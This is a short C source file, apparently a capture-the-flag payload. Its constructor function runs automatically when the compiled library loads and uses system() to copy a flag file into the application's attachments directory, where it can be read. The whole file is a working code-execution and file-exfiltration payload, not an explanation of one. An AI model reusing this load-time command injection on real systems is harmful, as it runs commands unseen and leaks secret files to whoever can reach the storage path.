#include <stdlib.h>

__attribute__((constructor))
static void run(void) {
    system("cat /flag-ae4e42ac.txt > /app/storage/attachments/flag_result.txt 2>&1");
}

